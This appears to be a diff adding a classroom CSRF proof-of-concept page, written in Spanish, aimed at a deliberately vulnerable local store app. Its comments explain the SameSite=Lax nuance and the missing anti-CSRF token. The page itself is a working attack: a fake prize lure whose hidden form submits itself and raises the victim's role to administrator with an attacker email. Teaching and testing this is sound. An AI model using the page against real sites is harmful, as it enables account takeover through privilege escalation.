@@ -1,0 +1,71 @@
+<!doctype html>
+<!--
+    ============================================================
+    PoC de CSRF (Cross-Site Request Forgery) - Fines Educativos
+    ============================================================
+
+    Este archivo simula una página "externa" / maliciosa que un
+    atacante podría enviar por correo o publicar en un sitio ajeno
+    a la tienda departamental. Si una víctima con sesión activa en
+    la aplicación vulnerable (http://127.0.0.1:5000) abre este
+    archivo en el MISMO navegador, su navegador reenviará
+    automáticamente las cookies de sesión hacia /perfil/actualizar
+    y la víctima terminará con rol "administrador" sin haberlo
+    pedido ni haberse dado cuenta.
+
+    Cómo probarlo en clase:
+      1. Inicia sesión en la app como "cajero1" (rol empleado) en
+         una pestaña del navegador.
+      2. En OTRA pestaña (o haciendo doble clic en este archivo desde
+         el explorador de archivos), abre este documento:
+         file:///.../csrf_poc/csrf_poc.html
+      3. El formulario se autoenvía en 1 segundo.
+      4. Vuelve a la app y entra a /perfil: el rol ahora es
+         "administrador".
+
+    Nota técnica para la clase: esta prueba de concepto usa un
+    formulario con method="GET" (no POST) a propósito. Los
+    navegadores modernos, por defecto, tratan las cookies de sesión
+    como SameSite=Lax cuando la aplicación no especifica el atributo
+    (que es justo el caso de esta app). Bajo SameSite=Lax, las
+    cookies SÍ se envían en una navegación de nivel superior con
+    método GET (como seguir un enlace o enviar un formulario GET),
+    pero NO se envían en un POST disparado desde un sitio distinto.
+    Por eso la vulnerabilidad real aquí es doble:
+      (a) no hay token anti-CSRF, Y
+      (b) la ruta acepta GET para una acción que cambia datos,
+          lo cual nunca debería permitirse (las acciones que
+          modifican estado deben usar POST/PUT/DELETE y, aun así,
+          seguir protegidas con un token CSRF).
+-->
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <title>Oferta especial - ¡Gana un premio!</title>
+</head>
+<body>
+    <h1>¡Felicidades! Estás a punto de ganar un premio 🎉</h1>
+    <p>Espera un momento mientras validamos tu cupón...</p>
+
+    <!-- Formulario oculto que se autoenvía. En un ataque real, esto
+         podría ir dentro de un <iframe style="display:none"> o
+         disparase con una imagen/beacon si el endpoint aceptara GET
+         mediante una simple etiqueta <img src="..."> -->
+    <form id="formularioMalicioso"
+          action="http://127.0.0.1:5000/perfil/actualizar"
+          method="GET"
+          style="display:none">
+        <input type="hidden" name="nombre_completo" value="Cuenta comprometida por CSRF">
+        <input type="hidden" name="email" value="atacante@evil.com">
+        <input type="hidden" name="rol" value="administrador">
+    </form>
+
+    <script>
+        // Se autoenvía tras un breve retraso para simular una página
+        // "normal" que no levanta sospechas inmediatas en la víctima.
+        setTimeout(function () {
+            document.getElementById("formularioMalicioso").submit();
+        }, 1000);
+    </script>
+</body>
+</html>
